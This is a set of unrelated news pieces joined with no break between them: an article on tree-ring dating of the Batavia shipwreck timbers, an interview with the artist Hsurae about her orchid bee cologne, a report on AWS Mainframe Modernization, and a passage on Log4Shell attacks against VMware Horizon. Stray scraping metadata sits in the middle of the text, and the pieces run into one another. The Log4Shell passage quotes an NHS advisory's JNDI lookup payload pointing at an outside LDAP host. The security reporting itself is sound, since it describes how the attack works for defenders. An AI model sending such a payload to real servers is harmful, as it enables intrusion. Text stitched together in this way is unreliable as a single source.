The subject of books, articles, plays, and even an opera, Batavia was wrecked on a chain of small islands off the coast of Western Australia.\n Of Batavia\u2019s 341 crew and passengers, 40 drowned trying to get off the ship, while all others made it to the uninhabited islands nearby. The captain, senior officers, two women, and one child left in one of the ship\u2019s boats to get help. But further tragedy followed.\n A group of men on the islands who had gathered around the acting commander deliberately drowned, strangled, cut the throats, or brutally hacked to death 125 children, women, and men. When the rescue party returned months later, they managed to overpower this death squad and bring the remaining survivors to safety. Together with its many victims and the murderers, Batavia\u2019s wreckage was left in the Houtman Abrolhos archipelago.\n The Dutch ship was 45.3 meters long and 600 metric tons in size. It sank on its maiden voyage to Southeast Asia. The shipwreck was found in the 1960s off Morning Reef and was excavated in the 1970s.\n  The surviving stern section, now in Fremantle\u2019s Western Australian Shipwrecks Museum, is the only portion of any early 17th-century Dutch East India ship raised from the seabed and preserved.\n Previously, historians could only guess where the timber for such ships came from, when it was felled, or how it was used, as archival records of Dutch timber trade before 1650 are rare or lost.\n But in\u00a0 new research, we studied the tree rings of the Batavia shipwreck timbers. We have found that the oak for the hull was sourced from two separate forests (in northern Germany and the Baltic region), with wood for the framing elements coming predominantly from the forests of Lower Saxony. The timber was processed shortly after the trees were felled (in 1625 or later) and was still green when the shipbuilders cut and bent the planks into shape.\n Knowing more about these timbers helps us understand the Dutch success in world trade, including how they managed to build such large ocean-going vessels and so many of them.\n   Batavia\u2019s remains provide a rare archaeological resource for tree-ring examination because exact dates of its construction and sinking are known.\n Construction began sometime in the spring of 1626, and the ship set sail from Texel (the Netherlands) to the East Indies (known today as Indonesia) in October 1628. It struck a reef on June 4, 1629. As Batavia had never undergone repairs or maintenance work, we know every piece of timber belongs to the original structure.\n When Batavia was built, the Dutch were the foremost shipbuilders in Europe. By 1640, for example, around 1,000 seagoing ships were being constructed in the Netherlands each year, mostly for export markets.\n The Dutch lacked domestic timber resources to supply the bustling shipbuilding industry and yet would have needed hundreds, perhaps thousands, of oak trees to build Batavia.\n Where did all this timber come from? The Dutch East India Company archives provide no detailed information on where its shipyards bought timber at the time of Batavia\u2019s construction. While the company kept detailed records from the mid-17th century onward, hardly any of those from the early 1600s have survived.\n Fortunately, tree rings can provide answers to those questions. Trees in temperate climate zones form a growth ring each year, just under the bark. This sequence of growth rings produced over years and decades acts like an environmental bar code, a growth pattern that is particular to the place where they grew and died.\n  This growth pattern is very similar for trees of the same species growing in the same area.\n By measuring the ring widths from many trees, a reference tree-ring chronology can be built. Then, we can cross match the growth pattern of a specific timber to such reference chronologies, establishing when the tree was felled and where it had grown. This field of study is  known as dendrochronology.\n The many Batavia timbers we sampled had only heartwood, or interior rings, demonstrating that Dutch shipbuilders discarded the sapwood (outer rings). Sapwood is softer and contains substances that make it more vulnerable to insect infestation and decay.\n Furthermore, the outermost heartwood ring of the Batavia hull planks that we sampled dates to 1616. When accounting for the missing sapwood (nine rings for Baltic oak), this means the trees were felled in 1625 or later.\n The timber was processed shortly after the trees were felled. All this demonstrates that Batavia\u2019s builders were skilled craftspersons, intimately familiar with the properties of the wood they used.\n  The oak timber used in Batavia\u2019s hull planks came from two forests. Trees from near L\u00fcbeck in northern Germany were used above the ship\u2019s waterline, while timber from the Baltic region of Northeastern Europe was applied exclusively below the waterline.\n This Baltic timber was prized by artists like\u00a0 Rembrandt, who used it for panels on which to paint. Trees from this region had beautifully straight trunks with very fine growth rings, making the wood easy to work and stable.\n Obviously, company shipbuilders valued these same properties when building ships strong enough to endure several return voyages to Southeast Asia. They avoided using trees with knots in the hull and preferred wood from which they could fashion long and strong planks.\n  In contrast, we found that the timber for Batavia\u2019s framing elements came predominantly from the forests of Lower Saxony (northwest Germany). Frames utilized the strong properties of these oaks\u2019 curved wood fibers. As it was sourced closer to home, this timber may have been cheaper and easier to acquire.\n Our study was only possible because Batavia\u2019s hull was raised in its entirety. Waterlogged wood is mushy, so extracting samples from the timbers while still under water is always challenging. It also would have required cutting out large sections of the ship to access all the different elements.", "posttime": "2022-01-10 01:17:14", "source_domain": "news.ycombinator.com", "source_name":

"With the new work  Euglossini cologne, interdisciplinary artist Hsurae has made a case for why the new scent she has created is not merely metaphoric and why reconstructed scents are intellectual structures, really little more than a metaphor or an abstraction of what once was.\n Orchid bees ( Euglossini) have a unique fragrance biology\u2014 they are thought to be the only species other than humans that gather ingredients and make fragrance compositions. In decline from Mexico to Brazil, these bees are the sole pollinators of many flowers including the Vanilla Orchid.\u00a0 Hsurae has created a computation of the fragrance of this bee through \u201cscientific instrumentality.\u201d She has written, \u201cWhen their ecology is dead and the species long gone, this may serve as the only memory of the orchid bee.\u201d\n   Even though it\u2019s about this sense of this organic animal, it\u2019s really about how the memory of this  species can become encapsulated by scientific means, and how science tells its stories about this relationship with nature. I was very inspired by this collaborative project between Daisy Ginsberg, Sissel Tolaas and synthetic biologists, that took place at Ginkgo Bioworks in Boston.\n The project \u201cResurrecting the Sublime\u201d that was about reviving the scent of extinct plants?\n Yes, they went through extinct species in the Harvard Arboretum and extracted DNA and analyzed it. Then they revived some of the aromatic compounds that were used to create the scent of that particular plant.\n  I was drawn to this project because it felt like a very poetic move, trying to recreate a scent of something that\u2019s extinct. At the same time, Ginkgo Bioworks is a biotech company, so it\u2019s very scientific and deterministic. However, in the project, with the DNA that Ginkgo analyzed, there could be a lot of ways the different kinds of compounds could have been mixed together in any number of ratios to create the very specific scent to this plant, so the reconstruction of the flower\u2019s smell still may be lost. What they have is a variation they came up with, even though it\u2019s based on some sort of scientific DNA analysis, it\u2019s just one of the million possibilities of the scent that this plant could hold that nobody living has smelled before. But the way that the story is told is that the scientists collaborating with artists have managed to revive the scent of an extinct plant species. It got me thinking about the relationship of science with nature and how it turns nature into specimens, which can only specify their value as a thing, as an object to be observed.\n The first thing that struck me about  Euglossini cologne was that the fragrance was contained in this machined, corrosion resistant, stainless-steel vault of a bottle. Can tell us about that?\n I really wanted that kind of monolithic scientific authority. I wanted it to have an important presence in this scent piece. And that was the reason for the container. It is a vessel for high pressure and high temperature chemical reactions. Inside the steel is a little Teflon tub and that\u2019s where the liquid is held. You might have noticed that there\u2019s a key, a steel rod that goes through it to create a very tight secure encapsulation. That\u2019s the key to tighten that seal. It gets you more leverage to really tighten it down. When you remove it, you\u2019re not supposed to be able to open the chamber by hand. In that way, it also functions as a kind of time capsule. And so that goes with what I was saying about the timeframe of this piece.\n How did you arrive at the need to preserve the smell that the orchid bee creates?\n Well, I actually first arrived at bee orchid by way of the XKCD comic strip.\u00a0There\u2019s this kind of sexual reproduction replication happening in certain species of orchids that binds the bee species pollinating them to itself. Certain species of orchids rely on a specific kind of bee to pollinate them. A lot of them form these one-to-one mutual relationships. And through time, the sexual organs of these orchid flowers evolve to look like the female species of that bee that they want to pollinate them.\n There was this comic strip by XKCD that is about this bee orchid. It narrates that there\u2019s this kind of orchid, whose partner bee has gone extinct, so the only memory we have of this bee that once existed lies in the interpretation of a flower of what the genital of this kind of bee looked like. It\u2019s quite a touching comic. The last frame stated that \u201cthe only memory of the bee is a painting by a dying flower.\u201d\n Then Donna Haraway wrote about this. So, I first came to this little anecdote through that comic strip, but then reading Haraway\u2019s book, \u201cStaying with the Trouble\u201d in the chapter about sym-poiesis, which means \u2018making with\u2019, she was talking about this particular comic strip, commenting on how it\u2019s special because it didn\u2019t mistake lures for identity. It\u2019s not saying that this bee orchid is exactly what the female bee\u2019s reproductive organs look like. It is a rendering of its image through the interpretation of the flower.\n  I arrived at the orchid bee by chance, when I was googling bee orchid but typed it in reverse. But then I saw how these bees were really the first species in nature to create perfumes. That was the part that got me interested in orchid bees. So, I started reading more and more about them. There are many types of orchid bees. I feel like the scent they collect is really a map of the territory that they inhabit. It\u2019s like a scent map. It\u2019s also a lot of the bees\u2019 agency that goes into creating their particular types of scent. I was thinking about that and reading accounts of how more and more of these kinds of bees are going extinct because their habitats are being destroyed. That\u2019s one of the reasons why my statement for this piece is in a style that mimics that last line of the comic where it says the last memory of the extinct bee is painted by a dying flower. I was thinking about how, when all the habitats are gone and all of these species are extinct, how science might claim to recreate this ephemeral smell that they made during their lifetimes\u2026\n In  Euglossini cologne,the scent compounds used in this smell are mimicking the scent traps that are used by scientists to trap orchid bees for study. It\u2019s a synthesis of the smell through science, but it\u2019s also an interpretation, a very human interpretation through the tools of science of what the scent could smell like, and how that serves as a more accurate memory of this species.\n So, the scent that you have created is based on the hormonal chemical components that research scientists deciphered that attract the male bee?\u00a0The bee\u2019s perfume that it compiled on its body was not scientifically analyzed?\n Yes. What scents they collect is dependent on which species of orchid bees they are and their particular habitat. They\u2019re known to collect from sources that we humans find disgusting, like feces or rotten meat or rotting wood, but it\u2019s the complexity of their perfume that really counts when it comes to mating season, and not really how pleasant smelling that perfume is. It\u2019s that unpleasant aspect of it, but I really wanted the skatole to come out.\n The work takes one into insect cognition and perception of scent, questioning the difference of scent perception in human species and insect species. What\u2019s actually perceived as pleasant and what\u2019s conceived as important.\n What is conceived as a culturally important scent? I\u2019ve also been reading a lot about olfactory racism and how scent is construed in the social life and how power lacks scent. When you go into institutions that are supposed to be some kind of institute of authority, like a bank or a museum, you don\u2019t smell anything. The lack of smell is a symbol of power. And what humans find disgusting is very much conditioned through the colonial era. And so, how what we deem as pleasant and unpleasant is already racially coded, are some facets that really interest me about scents. It\u2019s not just how good it smells or how bad it smells, but it\u2019s all really ingrained in there.\n   When did your interest in the smell and the chemical communication enter your work?\u00a0 Is this your most important work so far in that area?\n Yes, kind of. I guess that interest developed as I was fermenting different kinds of materials. So, SCOBY is one of them. I also ferment vegetables, seafood sometimes, and it\u2019s become a real interest of mine. And in the beginning, it was more about the material that I was interested in using, as in using in my own practice. But then in the process of fermenting these things, the scent of it really starts to impose on you. And for me, especially in New York where living space is so small and tight, I was really living in those quarters with all these different scents. And I was just really interested in  kind of this medium as its own medium of communication that we humans really don\u2019t understand as much as we like.\n I have always been interested in the scientific side of scents. My work with the SCOBY was heavily about the microbiome and how we\u2019re outnumbered by other cells and how we can reconstruct our own sense of identity and individualism through this knowledge that we\u2019re always more other than ourselves, like what we can see to be ourselves. And so, in all these microbiome studies, I would be drawn to scent repercussions in microbiomes. There\u2019s always been the knowledge that, for example, we choose our partners subconsciously on the kind of scent that they  admit emit. And we\u2019ve never really understood why. And now there\u2019s a microbiome interpretation of that saying that it\u2019s this subconscious form of communication that\u2019s not to the human, but maybe to the immune system, to the cells in the immune system or the bacteria in the microbiome of the human that communicates that this person\u2019s microbiome and hence immune system is complimentary to your own.\n So that scent that we\u2019re drawn to is us looking, subconsciously looking for compatible immunological profiles to form partnerships with, because it maybe evolution that gave us an advantage to form family units with people whose health is complementary to our own. I approached or arrived at scent in these two very different ways. One is a very embodied, very lived-in relationship with different scents. And then the other is really more cerebral or more intellectual engagement with  its scent. It all kind of came together with this new piece in the exhibition New York/New Fumes.\n Considering you have this background with the biome and the fact that bacteria manufacture different volatile compounds\u2014 smells, what do you think about the idea that the bees might be collecting the types of microorganisms that they need. Bacteria produce characteristic odors.\n That could be. That could very much be. Maybe they\u2019re collecting their own little microbiomes. However, I don\u2019t think I\u2019ve read anything about it. I\u2019ve read about microbiomes and bees that exist under guts, but for these orchid bees, they collect these scents into these two pouches under their hind legs and they rub them against their front legs which covers the scent compounds in lipids and fat, and stores it in that pouch. So, some sort of chemical reaction I think happens in the pouch. I\u2019m not completely sure there is a live bacterial community inside those pouches, but it could be that maybe there\u2019s more to what they\u2019re collecting than just thinking of them, oh, how cute, these bees collect and make their own perfumes. Maybe it serves another kind of purpose that we don\u2019t understand yet.\n Speaking of which, I\u2019m aware that Orchid bees do a particular performance to push the scent into the air, into the perceivability of the female. Can you tell us about that?\n I\u2019ve seen videos of this behavior and I think they all vary a little bit, so it\u2019s not like they all do the same dance, but they all do a kind of dance with their wings and their legs that creates like a pumping motion that sprays the scent they\u2019ve collected in their hind leg pouches into the air in front of the female during mating season.\n The fact that Orchid bee courtship behavior involves creating and sharing a cologne is an interesting phenomenon.\n Science understands it as a means to serve the purpose of getting the scent out in a mist form, but I like to think about it as a ritualistic dance or ceremonial dance, it gives it another dimension to be understood by. Maybe this is a spiritual experience for them. Maybe it is just pleasure. We tend to write about it as this tool they use for mating, like the Bowerbird that collects beautiful objects and makes a house out of it to impress the female. Maybe it\u2019s more than that. Maybe there\u2019s something to it that we don\u2019t get, and that\u2019s ok.\n P retty much all our observations of behaviors, especially in animals and insects, are given Darwinian-based interpretations. What are your hopes for this piece in terms of thinking about the ecological and biodiversity extinction crisis that we\u2019re in? I felt like you were a making a big statement about chemical communication in nature and the key role pollinators play in life cycles of aromatic flowering plants. These are complex relationships. Can you talk a little bit about it?\n I would hope someone would walk away from the piece with a feeling of a lack because that smell is, like I said, it could be one in a million of interpretations that\u2019s made on what a perfume collected by an orchid bee may smell like. And so that itself is already a loss. And then to think about this scent in terms of extinction really puts it in a timeframe where the situation we\u2019re in now might really feel like, as something that\u2019s already bygone. If that makes any sense. I hope someone could encounter this piece and, well, be left with a chance to think about the times we\u2019re in and what could be done to provoke some sort of emotion and then perhaps action.\n That\u2019s part of the reasons why World Sensorium Conservancy is working conserve aromatic plants. To actually preserve the scent, we must preserve the plant. But what we are really talking about is conserving ecological communities. I felt that  Euglossini cologne brings attention to the pollinators and how the symbiotic relationship between pollinators and the plants are intertwined in the survival.\n The work took me to the plants are severe decline and threatened with extinction. The artwork brings attention to the fact that there\u2019s really no way to preserve their smell yet. There is progress in chemical analysis and recreations but these really aren\u2019t accurate- they\u2019re high concept. We must save the plants, and the community of species that create the smells. it means also saving the ecosystems because the bacteria are often the producers of the smells and you have to save the bacteria. We need to be conserving whole ecological communities. These are very powerful and primal relationships that are jeopardy.\n I completely agree. We need to be thinking about the rhizomatic connections in an ecology that interweaves into each other\u2019s survival, instead of viewing each plant as a specimen. I was brought up with a positivist mentality, and even though I\u2019ve come to find much joy in science, I\u2019m also learning that there are no technofixes. It is tempting to buy into the narrative that scientists will engineer bacteria to digest plastic waste or that extinct wooly mammoths can be resurrected in a lab, but as we\u2019ve witnessed with each case, there can be no isolated solution for a global ecological crisis. The scientific community didn\u2019t learn about the underground mycelial wood wide web until 1997 (while sylvan communication has been described in many indigenous epistemologies), and we are slowly coming to terms with the impact that our microbial communities have on us. Our understanding of conservation needs to be as networked, grounded and interconnected as the microbial inter-glot that sustains our environments, inside and out, with or without our (scientific) knowledge.\n HsuRae\u00a0 (Taiwanese) is an artist and educator of Bioart and endosymbiotic aesthetics.

Some might want to refactor their mainframe workloads to run on AWS by transforming legacy applications \u2013  likely written in COBOL \u2013 into modern Java-based cloud services.\n  Alternatively, customers can keep their applications as written and re-platform their workloads to AWS reusing existing code with minimal changes.\n  Mainframe Modernization promises a complete, end-to-end migration pipeline that includes development, testing, and deployment tools necessary to automate the process.\n  \u201cWith today\u2019s launch of AWS Mainframe Modernization, customers and systems integrators can now more quickly modernize their legacy mainframe workloads in a predictable way and get rid of much of the complexity and manual work involved in migrations,\u201d said William Platt, GM of Migration Services at AWS.\n  The service puts the cloud vendor at odds with mainframe manufacturers and specialist software vendors that include IBM, Unisys, Bull, NEC, and Fujitsu.\n  Mainframe Modernization was presented at this week\u2019s re:Invent conference in Las Vegas, where AWS also announced the expansion of the Outpost hardware line-up, a private 5G networking service, and new EC2 instances.\n    More than 50 years after the appearance of the first mainframe, the IBM System/360, these hulking machines are still a common sight in banking, insurance, and retail, thanks to their ability to efficiently process huge volumes of transactions, and their reputation for security and uptime.\n  However, these systems are incredibly expensive and difficult to maintain, and the pool of people qualified to deal with their legacy software is shrinking all the time.\n  AWS has been trying to get customers off mainframes and into its data centers  for years. This time, the company says it has built a runtime enthronement provides all the necessary compute, memory, and storage to run both refactored and replatformed applications while automatically handling capacity provisioning, security, load balancing, scaling, and application health monitoring.\n  Since this is all done via public cloud, there are no upfront costs, and customers only pay for the amount of compute provisioned.\n  Brazil\u2019s Banco Inter was among the first organizations to sign up for Mainframe Modernization with AWS.\n  \u201cBy using the AWS Mainframe Modernization managed runtime, we expect to simplify our card processor operations for enhanced resiliency and scalability,\u201d said Guilherme Ximenes, CTO at Banco Inter. \u201cWe are also excited by the DevOps CI/CD pipeline for increasing the agility we need to more quickly deliver new credit and debit card transaction capabilities to our customers.\u201d\n  AWS Mainframe Modernization is available in preview in US East (N. Virginia), US West (Oregon), Asia Pacific (Sydney), EU (Frankfurt), and South America (S\u00e3o Paulo) regions, before being expanded to additional locations \u201cin the coming months.\u201d\n  The AWS approach to refactoring legacy software is not unique: a similar model has been promoted by other companies, like the Swiss startup LzLabs, which has been developing a product called Software-Defined Mainframe since 2011, based on its own COBOL and Java interoperability architecture.\n  Going in a different direction, the Open Mainframe Project  founded in 2015 is attempting to make existing machines a lot more useful, by teaching them to run on Linux, rather than proprietary operating systems like z/OS.\n  It would be useful to note that the death of the mainframe has been predicted for  at least two decades, and yet these machines have managed to stay surprisingly relevant.\n  Do you have strong opinions about mainframes?

It resides in Log4J, a system-logging code library used in thousands if not millions of third-party applications and websites. That means there is a huge base of vulnerable systems. Additionally, the vulnerability is extremely easy to exploit and allows attackers to install Web shells, which provide a command window for executing highly privileged commands on hacked servers.\n  The remote-code execution flaw in Log4J  came to light in December after exploit code was released before a patch was available. Malicious hackers quickly began  actively exploiting CVE-2021-44228 to  compromise sensitive systems.  \u201cAn unknown threat group has been observed targeting VMware Horizon servers running versions affected by  Log4Shell vulnerabilities in order to establish persistence within affected networks,\u201d officials with the UK\u2019s National Health System  wrote. They went on to provide guidance on specific steps affected organizations can take to mitigate the threat.\n Chief among them is the recommendation to install an update that\u00a0 VMware released for its Horizon product, which gives organizations a means to virtualize desktop and app capabilities using the company\u2019s virtualization technology. NHS officials also noted signs that vulnerable organizations can look for to identify any possible attacks they may have sustained.\n  The advisory comes a day after the Federal Trade Commission\u00a0 warned consumer-facing businesses to patch vulnerable systems to avoid the fate of Equifax. In 2019, the credit-reporting agency agreed to  pay $575 million to settle FTC charges resulting from its failure to patch a similarly severe vulnerability in a different piece of software known as Apache Struts. When an unknown attacker exploited the vulnerability in Equifax\u2019s network, it led to the  compromise of sensitive data for 143 million people, making it among one of the  worst data breaches ever. \u201cThe FTC intends to use its full legal authority to pursue companies that fail to take\u202freasonable\u202fsteps to protect consumer data from exposure\u202fas a result of Log4j or similar known vulnerabilities in the future,\u201d FTC officials  said\n    The NHS is at least the second organization to observe exploits targeting a VMware product. Last month, researchers  reported that attackers were targeting systems running VMware VCenter with the aim of installing the Conti ransomware.\n The attacks targeting unpatched VMware Horizon servers take aim at its use of an open source service.\n \u201cThe attack is very likely initiated via a Log4Shell payload similar to ${jndi:ldap://example.com},\u201d the NHS advisory stated. \u201cThe attack exploits the Log4Shell vulnerability in the Apache Tomcat service which is embedded within VMware Horizon.
